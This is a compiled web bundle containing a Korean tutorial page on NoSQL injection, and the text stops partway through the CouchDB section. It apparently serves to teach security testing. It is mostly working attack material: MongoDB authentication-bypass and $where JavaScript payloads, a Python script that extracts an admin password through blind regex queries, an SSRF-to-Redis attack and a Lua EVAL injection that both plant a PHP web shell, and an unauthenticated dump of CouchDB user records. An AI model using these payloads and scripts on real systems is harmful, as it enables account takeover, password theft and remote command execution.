"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5668],{28453:(n,e,s)=>{s.d(e,{R:()=>d,x:()=>c});var i=s(96540);const r={},l=i.createContext(r);function d(n){const e=i.useContext(l);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:d(n.components),i.createElement(l.Provider,{value:e},n.children)}},74335:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>a,contentTitle:()=>c,default:()=>h,frontMatter:()=>d,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"web_attacks/sql_injection/nosql_injection","title":"NoSQL Injection","description":"MongoDB, Redis, CouchDB \ub4f1 NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4 Injection \uacf5\uaca9 \uae30\ubc95","source":"@site/docs/web_attacks/sql_injection/13_nosql_injection.md","sourceDirName":"web_attacks/sql_injection","slug":"/web_attacks/sql_injection/nosql_injection","permalink":"/my-docusaurus-page/web_attacks/sql_injection/nosql_injection","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":13,"frontMatter":{"sidebar_position":13,"title":"NoSQL Injection","description":"MongoDB, Redis, CouchDB \ub4f1 NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4 Injection \uacf5\uaca9 \uae30\ubc95","keywords":["nosql injection","mongodb injection","redis injection","couchdb","nosql security"]},"sidebar":"tutorialSidebar","previous":{"title":"Rooted-based SQL Injection","permalink":"/my-docusaurus-page/web_attacks/sql_injection/rooted_based"},"next":{"title":"\uace0\uae09 \uc775\uc2a4\ud50c\ub85c\uc787 (Advanced Exploitation)","permalink":"/my-docusaurus-page/web_attacks/sql_injection/advanced_exploitation"}}');var r=s(74848),l=s(28453);const d={sidebar_position:13,title:"NoSQL Injection",description:"MongoDB, Redis, CouchDB \ub4f1 NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4 Injection \uacf5\uaca9 \uae30\ubc95",keywords:["nosql injection","mongodb injection","redis injection","couchdb","nosql security"]},c="NoSQL Injection",a={},o=[{value:"\uac1c\ub150 (Concept)",id:"\uac1c\ub150-concept",level:2},{value:"NoSQL Injection\uc774\ub780?",id:"nosql-injection\uc774\ub780",level:3},{value:"SQL vs NoSQL",id:"sql-vs-nosql",level:3},{value:"MongoDB Injection",id:"mongodb-injection",level:2},{value:"\uae30\ubcf8 \uac1c\ub150",id:"\uae30\ubcf8-\uac1c\ub150",level:3},{value:"\uc778\uc99d \uc6b0\ud68c (Authentication Bypass)",id:"\uc778\uc99d-\uc6b0\ud68c-authentication-bypass",level:3},{value:"\ubc29\ubc95 1: $ne \uc5f0\uc0b0\uc790",id:"\ubc29\ubc95-1-ne-\uc5f0\uc0b0\uc790",level:4},{value:"\ubc29\ubc95 2: $regex \uc5f0\uc0b0\uc790",id:"\ubc29\ubc95-2-regex-\uc5f0\uc0b0\uc790",level:4},{value:"\ubc29\ubc95 3: $gt, $lt \uc5f0\uc0b0\uc790",id:"\ubc29\ubc95-3-gt-lt-\uc5f0\uc0b0\uc790",level:4},{value:"URL \uc778\ucf54\ub529 \ubc29\uc2dd",id:"url-\uc778\ucf54\ub529-\ubc29\uc2dd",level:4},{value:"Blind NoSQL Injection",id:"blind-nosql-injection",level:3},{value:"Boolean-based",id:"boolean-based",level:4},{value:"\uc790\ub3d9\ud654 \uc2a4\ud06c\ub9bd\ud2b8 (Python)",id:"\uc790\ub3d9\ud654-\uc2a4\ud06c\ub9bd\ud2b8-python",level:4},{value:"MongoDB \uc5f0\uc0b0\uc790 \uc545\uc6a9",id:"mongodb-\uc5f0\uc0b0\uc790-\uc545\uc6a9",level:3},{value:"$where \uc5f0\uc0b0\uc790 (JavaScript \uc2e4\ud589)",id:"where-\uc5f0\uc0b0\uc790-javascript-\uc2e4\ud589",level:4},{value:"$where\ub97c \uc774\uc6a9\ud55c Time-based Blind",id:"where\ub97c-\uc774\uc6a9\ud55c-time-based-blind",level:4},{value:"\ub370\uc774\ud130 \ucd94\ucd9c",id:"\ub370\uc774\ud130-\ucd94\ucd9c",level:3},{value:"$in \uc5f0\uc0b0\uc790",id:"in-\uc5f0\uc0b0\uc790",level:4},{value:"$nin \uc5f0\uc0b0\uc790 (Not In)",id:"nin-\uc5f0\uc0b0\uc790-not-in",level:4},{value:"Redis Injection",id:"redis-injection",level:2},{value:"Redis \uae30\ubcf8 \uac1c\ub150",id:"redis-\uae30\ubcf8-\uac1c\ub150",level:3},{value:"SSRF\ub97c \ud1b5\ud55c Redis \uacf5\uaca9",id:"ssrf\ub97c-\ud1b5\ud55c-redis-\uacf5\uaca9",level:3},{value:"Lua Script Injection",id:"lua-script-injection",level:3},{value:"CouchDB Injection",id:"couchdb-injection",level:2},{value:"CouchDB \uae30\ubcf8 \uac1c\ub150",id:"couchdb-\uae30\ubcf8-\uac1c\ub150",level:3},{value:"\uc778\uc99d \uc6b0\ud68c",id:"\uc778\uc99d-\uc6b0\ud68c",level:3},{value:"Mango Query Injection",id:"mango-query-injection",level:3},{value:"Cassandra Injection",id:"cassandra-injection",level:2},{value:"CQL (Cassandra Query Language)",id:"cql-cassandra-query-language",level:3},{value:"ElasticSearch Injection",id:"elasticsearch-injection",level:2},{value:"ElasticSearch Query DSL",id:"elasticsearch-query-dsl",level:3},{value:"Script Query \uc545\uc6a9",id:"script-query-\uc545\uc6a9",level:3},{value:"\uc790\ub3d9\ud654 \ub3c4\uad6c",id:"\uc790\ub3d9\ud654-\ub3c4\uad6c",level:2},{value:"NoSQLMap",id:"nosqlmap",level:3},{value:"Burp Suite - NoSQL Scanner",id:"burp-suite---nosql-scanner",level:3},{value:"\uc2e4\uc804 \uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624",id:"\uc2e4\uc804-\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624",level:2},{value:"\uc2dc\ub098\ub9ac\uc624: MongoDB \uc778\uc99d \uc6b0\ud68c + \ube44\ubc00\ubc88\ud638 \ucd94\ucd9c",id:"\uc2dc\ub098\ub9ac\uc624-mongodb-\uc778\uc99d-\uc6b0\ud68c--\ube44\ubc00\ubc88\ud638-\ucd94\ucd9c",level:3},{value:"\ubc29\uc5b4 \uae30\ubc95",id:"\ubc29\uc5b4-\uae30\ubc95",level:2},{value:"1. Input Validation",id:"1-input-validation",level:3},{value:"2. Schema Validation (Mongoose)",id:"2-schema-validation-mongoose",level:3},{value:"3. Sanitization",id:"3-sanitization",level:3},{value:"4. \ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59",id:"4-\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",level:3},{value:"5. Rate Limiting",id:"5-rate-limiting",level:3},{value:"\ud2b8\ub7ec\ube14\uc288\ud305 \uccb4\ud06c\ub9ac\uc2a4\ud2b8",id:"\ud2b8\ub7ec\ube14\uc288\ud305-\uccb4\ud06c\ub9ac\uc2a4\ud2b8",level:2},{value:"NoSQL Injection\uc774 \uc548 \ub420 \ub54c",id:"nosql-injection\uc774-\uc548-\ub420-\ub54c",level:3},{value:"Blind Injection\uc774 \ub290\ub9b4 \ub54c",id:"blind-injection\uc774-\ub290\ub9b4-\ub54c",level:3},{value:"\uc790\ub3d9\ud654 \ub3c4\uad6c \uc2e4\ud328 \uc2dc",id:"\uc790\ub3d9\ud654-\ub3c4\uad6c-\uc2e4\ud328-\uc2dc",level:3},{value:"\ube60\ub978 \uba85\ub839\uc5b4 \ucc38\uc870",id:"\ube60\ub978-\uba85\ub839\uc5b4-\ucc38\uc870",level:2},{value:"MongoDB Injection",id:"mongodb-injection-1",level:3},{value:"URL \uc778\ucf54\ub529",id:"url-\uc778\ucf54\ub529",level:3},{value:"NoSQLMap",id:"nosqlmap-1",level:3},{value:"Python \uc790\ub3d9\ud654",id:"python-\uc790\ub3d9\ud654",level:3},{value:"\ucc38\uace0 \uc790\ub8cc",id:"\ucc38\uace0-\uc790\ub8cc",level:2},{value:"\ub2e4\uc74c \ub2e8\uacc4",id:"\ub2e4\uc74c-\ub2e8\uacc4",level:2}];function t(n){const e={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",input:"input",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,l.R)(),...n.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.header,{children:(0,r.jsx)(e.h1,{id:"nosql-injection",children:"NoSQL Injection"})}),"\n",(0,r.jsxs)(e.blockquote,{children:["\n",(0,r.jsx)(e.p,{children:"NoSQL Injection\uc740 MongoDB, Redis, CouchDB \ub4f1 NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4\ub97c \ub300\uc0c1\uc73c\ub85c \ud558\ub294 Injection \uacf5\uaca9\uc785\ub2c8\ub2e4."}),"\n"]}),"\n",(0,r.jsx)(e.h2,{id:"\uac1c\ub150-concept",children:"\uac1c\ub150 (Concept)"}),"\n",(0,r.jsx)(e.h3,{id:"nosql-injection\uc774\ub780",children:"NoSQL Injection\uc774\ub780?"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"NoSQL Injection"}),"\uc740 NoSQL \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc758 \ucffc\ub9ac \uad6c\uc870\ub97c \uc545\uc6a9\ud558\uc5ec:"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\uc778\uc99d \uc6b0\ud68c"}),"\n",(0,r.jsx)(e.li,{children:"\ub370\uc774\ud130 \ucd94\ucd9c"}),"\n",(0,r.jsx)(e.li,{children:"\uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,r.jsx)(e.li,{children:"DoS \uacf5\uaca9"}),"\n"]}),"\n",(0,r.jsx)(e.p,{children:"\uc744 \uc218\ud589\ud558\ub294 \uae30\ubc95\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(e.h3,{id:"sql-vs-nosql",children:"SQL vs NoSQL"}),"\n",(0,r.jsxs)(e.table,{children:[(0,r.jsx)(e.thead,{children:(0,r.jsxs)(e.tr,{children:[(0,r.jsx)(e.th,{children:"\uad6c\ubd84"}),(0,r.jsx)(e.th,{children:"SQL"}),(0,r.jsx)(e.th,{children:"NoSQL"})]})}),(0,r.jsxs)(e.tbody,{children:[(0,r.jsxs)(e.tr,{children:[(0,r.jsx)(e.td,{children:(0,r.jsx)(e.strong,{children:"\ucffc\ub9ac \uc5b8\uc5b4"})}),(0,r.jsx)(e.td,{children:"SQL (\ud45c\uc900\ud654)"}),(0,r.jsx)(e.td,{children:"\uac01 DB\ub9c8\ub2e4 \ub2e4\ub984"})]}),(0,r.jsxs)(e.tr,{children:[(0,r.jsx)(e.td,{children:(0,r.jsx)(e.strong,{children:"\ub370\uc774\ud130 \uad6c\uc870"})}),(0,r.jsx)(e.td,{children:"\ud14c\uc774\ube14 (\uad00\uacc4\ud615)"}),(0,r.jsx)(e.td,{children:"JSON, Key-Value, Document"})]}),(0,r.jsxs)(e.tr,{children:[(0,r.jsx)(e.td,{children:(0,r.jsx)(e.strong,{children:"Injection"})}),(0,r.jsx)(e.td,{children:(0,r.jsx)(e.code,{children:"' OR 1=1--"})}),(0,r.jsx)(e.td,{children:(0,r.jsx)(e.code,{children:'{"$ne": null}'})})]})]})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"mongodb-injection",children:"MongoDB Injection"}),"\n",(0,r.jsx)(e.h3,{id:"\uae30\ubcf8-\uac1c\ub150",children:"\uae30\ubcf8 \uac1c\ub150"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"MongoDB"}),"\ub294 JSON \uae30\ubc18 Document \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc785\ub2c8\ub2e4."]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"})," (JavaScript/Node.js):"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'db.users.find({\n    username: "admin",\n    password: "password123"\n});\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Injection \uacf5\uaca9"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'db.users.find({\n    username: {"$ne": null},\n    password: {"$ne": null}\n});\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\ubaa8\ub4e0 \uc0ac\uc6a9\uc790 \ubc18\ud658"})," (\uc778\uc99d \uc6b0\ud68c)"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"\uc778\uc99d-\uc6b0\ud68c-authentication-bypass",children:"\uc778\uc99d \uc6b0\ud68c (Authentication Bypass)"}),"\n",(0,r.jsx)(e.h4,{id:"\ubc29\ubc95-1-ne-\uc5f0\uc0b0\uc790",children:"\ubc29\ubc95 1: $ne \uc5f0\uc0b0\uc790"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ucf54\ub4dc"})," (Node.js + Express):"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    db.collection('users').findOne({\n        username: username,\n        password: password\n    }, (err, user) => {\n        if (user) {\n            res.send(\"Login successful\");\n        } else {\n            res.send(\"Login failed\");\n        }\n    });\n});\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"})," (JSON):"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": {"$ne": null},\n    "password": {"$ne": null}\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc2e4\uc81c \ucffc\ub9ac"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:'db.collection(\'users\').findOne({\n    username: {"$ne": null},\n    password: {"$ne": null}\n});\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\uccab \ubc88\uc9f8 \uc0ac\uc6a9\uc790 (\ubcf4\ud1b5 admin) \ub85c\uadf8\uc778 \uc131\uacf5"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h4,{id:"\ubc29\ubc95-2-regex-\uc5f0\uc0b0\uc790",children:"\ubc29\ubc95 2: $regex \uc5f0\uc0b0\uc790"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": {"$regex": "^admin"},\n    "password": {"$regex": ".*"}\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.code,{children:"admin"}),"\uc73c\ub85c \uc2dc\uc791\ud558\ub294 \uc0ac\uc6a9\uc790\uba85\uacfc \ubaa8\ub4e0 \ube44\ubc00\ubc88\ud638 \ub9e4\uce6d"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h4,{id:"\ubc29\ubc95-3-gt-lt-\uc5f0\uc0b0\uc790",children:"\ubc29\ubc95 3: $gt, $lt \uc5f0\uc0b0\uc790"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": {"$gt": ""}\n}\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u2192 \ube44\ubc00\ubc88\ud638\uac00 \ube48 \ubb38\uc790\uc5f4\ubcf4\ub2e4 \ud070 \uac12 (\ubaa8\ub4e0 \ubb38\uc790\uc5f4)"}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h4,{id:"url-\uc778\ucf54\ub529-\ubc29\uc2dd",children:"URL \uc778\ucf54\ub529 \ubc29\uc2dd"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"GET \uc694\uccad"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"http://example.com/login?username[$ne]=null&password[$ne]=null\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"POST \uc694\uccad"})," (application/x-www-form-urlencoded):"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"username[$ne]=null&password[$ne]=null\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"blind-nosql-injection",children:"Blind NoSQL Injection"}),"\n",(0,r.jsx)(e.h4,{id:"boolean-based",children:"Boolean-based"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ube44\ubc00\ubc88\ud638 \uae38\uc774 \ud655\uc778"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": {"$regex": "^.{32}$"}\n}\n'})}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\uc131\uacf5 \uc751\ub2f5 \u2192 \ube44\ubc00\ubc88\ud638 \uae38\uc774 32\uc790"}),"\n",(0,r.jsx)(e.li,{children:"\uc2e4\ud328 \uc751\ub2f5 \u2192 \ub2e4\ub978 \uae38\uc774"}),"\n"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uccab \ubc88\uc9f8 \ubb38\uc790 \ud655\uc778"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": {"$regex": "^a"}\n}\n'})}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\uc131\uacf5 \u2192 \uccab \ubb38\uc790\ub294 'a'"}),"\n",(0,r.jsx)(e.li,{children:"\uc2e4\ud328 \u2192 \ub2e4\ub978 \ubb38\uc790"}),"\n"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h4,{id:"\uc790\ub3d9\ud654-\uc2a4\ud06c\ub9bd\ud2b8-python",children:"\uc790\ub3d9\ud654 \uc2a4\ud06c\ub9bd\ud2b8 (Python)"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-python",children:'import requests\nimport string\n\nurl = "http://example.com/api/login"\npassword = ""\ncharset = string.ascii_letters + string.digits\n\nprint("[*] Starting MongoDB Blind Injection...")\n\nfor position in range(32):  # MD5 \ud574\uc2dc\ub294 32\uc790\n    for char in charset:\n        payload = {\n            "username": "admin",\n            "password": {"$regex": f"^{password}{char}"}\n        }\n\n        r = requests.post(url, json=payload)\n\n        if "success" in r.text or "Welcome" in r.text:\n            password += char\n            print(f"[+] Password: {password}")\n            break\n    else:\n        print(f"[!] Character not found at position {position}")\n        break\n\nprint(f"\\n[+] Final password: {password}")\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucd9c\ub825 \uc608\uc2dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"[*] Starting MongoDB Blind Injection...\n[+] Password: 5\n[+] Password: 5f\n[+] Password: 5f4\n...\n[+] Password: 5f4dcc3b5aa765d61d8327deb882cf99\n\n[+] Final password: 5f4dcc3b5aa765d61d8327deb882cf99\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"mongodb-\uc5f0\uc0b0\uc790-\uc545\uc6a9",children:"MongoDB \uc5f0\uc0b0\uc790 \uc545\uc6a9"}),"\n",(0,r.jsx)(e.h4,{id:"where-\uc5f0\uc0b0\uc790-javascript-\uc2e4\ud589",children:"$where \uc5f0\uc0b0\uc790 (JavaScript \uc2e4\ud589)"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ub9e4\uc6b0 \uc704\ud5d8"}),": JavaScript \ucf54\ub4dc\ub97c \uc9c1\uc811 \uc2e4\ud589"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \ucf54\ub4dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"db.users.find({\n    $where: `this.username == '${username}' && this.password == '${password}'`\n});\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": "\' || \'1\'==\'1"\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc2e4\ud589\ub418\ub294 JavaScript"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-javascript",children:"this.username == 'admin' && this.password == '' || '1'=='1'\n"})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\ud56d\uc0c1 \ucc38 (\ubaa8\ub4e0 \ubb38\uc11c \ubc18\ud658)"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h4,{id:"where\ub97c-\uc774\uc6a9\ud55c-time-based-blind",children:"$where\ub97c \uc774\uc6a9\ud55c Time-based Blind"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \ud398\uc774\ub85c\ub4dc"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": {\n        "$where": "sleep(5000) || true"\n    }\n}\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u2192 5\ucd08 \uc9c0\uc5f0 (Blind Injection \ud655\uc778)"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc870\uac74\ubd80 Time-based"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": "admin",\n    "password": {\n        "$where": "if (this.password[0] == \'a\') { sleep(5000); } return true;"\n    }\n}\n'})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"\ub370\uc774\ud130-\ucd94\ucd9c",children:"\ub370\uc774\ud130 \ucd94\ucd9c"}),"\n",(0,r.jsx)(e.h4,{id:"in-\uc5f0\uc0b0\uc790",children:"$in \uc5f0\uc0b0\uc790"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc0ac\uc6a9\uc790 \ubaa9\ub85d \ucd94\ucd9c"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": {"$in": ["admin", "root", "user1", "user2"]},\n    "password": {"$ne": null}\n}\n'})}),"\n",(0,r.jsx)(e.h4,{id:"nin-\uc5f0\uc0b0\uc790-not-in",children:"$nin \uc5f0\uc0b0\uc790 (Not In)"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n    "username": {"$nin": ["admin"]},\n    "password": {"$ne": null}\n}\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u2192 admin\uc744 \uc81c\uc678\ud55c \ubaa8\ub4e0 \uc0ac\uc6a9\uc790"}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"redis-injection",children:"Redis Injection"}),"\n",(0,r.jsx)(e.h3,{id:"redis-\uae30\ubcf8-\uac1c\ub150",children:"Redis \uae30\ubcf8 \uac1c\ub150"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Redis"}),"\ub294 Key-Value \uc800\uc7a5\uc18c\uc785\ub2c8\ub2e4."]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \uba85\ub839"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-redis",children:'GET user:admin:password\nSET user:hacker:password "hacked123"\n'})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"ssrf\ub97c-\ud1b5\ud55c-redis-\uacf5\uaca9",children:"SSRF\ub97c \ud1b5\ud55c Redis \uacf5\uaca9"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc2dc\ub098\ub9ac\uc624"}),": SSRF \ucde8\uc57d\uc810 + Redis (\uae30\ubcf8 \ud3ec\ud2b8 6379)"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9 \uc694\uccad"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"http://example.com/fetch?url=http://localhost:6379/\nPOST_DATA=SET%20shell%20\"<?php%20system($_GET['cmd']);%20?>\"\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Redis \uba85\ub839 \uc2e4\ud589"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-redis",children:"SET shell \"<?php system($_GET['cmd']); ?>\"\nSAVE\n"})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.code,{children:"/var/lib/redis/dump.rdb"}),"\uc5d0 \uc6f9\uc178 \uc800\uc7a5"]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"lua-script-injection",children:"Lua Script Injection"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Redis\ub294 Lua \uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589 \uac00\ub2a5"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-redis",children:"EVAL \"return redis.call('GET', KEYS[1])\" 1 user:admin:password\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Injection \uacf5\uaca9"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-redis",children:"EVAL \"return redis.call('SET', 'shell', '<?php system($_GET[\\\"cmd\\\"]); ?>')\" 0\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h2,{id:"couchdb-injection",children:"CouchDB Injection"}),"\n",(0,r.jsx)(e.h3,{id:"couchdb-\uae30\ubcf8-\uac1c\ub150",children:"CouchDB \uae30\ubcf8 \uac1c\ub150"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"CouchDB"}),"\ub294 HTTP REST API\ub97c \uc0ac\uc6a9\ud558\ub294 Document \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc785\ub2c8\ub2e4."]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc815\uc0c1 \ucffc\ub9ac"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"GET http://localhost:5984/users/_all_docs\n"})}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"\uc778\uc99d-\uc6b0\ud68c",children:"\uc778\uc99d \uc6b0\ud68c"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\ucde8\uc57d\ud55c \uc124\uc815"}),": ",(0,r.jsx)(e.code,{children:"_security"})," \ubb38\uc11c \ubbf8\uc124\uc815"]}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uacf5\uaca9"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-http",children:"GET http://example.com:5984/_users/_all_docs?include_docs=true HTTP/1.1\n"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"\uc751\ub2f5"}),":"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "rows": [\n    {\n      "id": "org.couchdb.user:admin",\n      "key": "admin",\n      "value": {"rev": "1-xxx"},\n      "doc": {\n        "name": "admin",\n        "password_sha": "5f4dcc3b5aa765d61d8327deb882cf99",\n        "roles": ["_admin"]\n      }\n    }\n  ]\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\u2192 ",(0,r.jsx)(e.strong,{children:"\uad00\ub9ac\uc790 \ube44\ubc00\ubc88\ud638 \ud574\uc2dc \ub178\ucd9c"})]}),"\n",(0,r.jsx)(e.hr,{}),"\n",(0,r.jsx)(e.h3,{id:"mango-query-injection",children:"Mango Query Injection"}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"CouchDB Mango"}),": SQL-like 